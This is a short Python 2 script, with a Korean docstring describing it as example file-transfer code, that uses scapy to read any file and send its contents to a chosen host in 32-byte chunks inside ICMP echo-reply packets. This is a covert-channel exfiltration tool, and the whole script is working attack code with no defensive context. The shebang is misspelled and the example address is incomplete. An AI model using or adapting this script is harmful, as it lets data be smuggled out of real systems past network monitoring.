#!/usr/bin/env pytohn
#-*- coding: utf-8 -*-
'''
	python ==> python ~.py /bin/nc.traditional 172.30.148 을 사용해 파일을 전송하는 예제 코드
'''
import sys
from scapy.all import *

conf.verb = 0
f = open(sys.argv[1])
data = f.read()
f.close()
host= sys.argv[2]

print "Data size is %d " % len(data)

i = 0

while i < len(data):
	pack = IP(dst = host) / ICMP(type = "echo-reply") / data[i:i+32]
	send(pack)
	i += 32

print "Data sent"
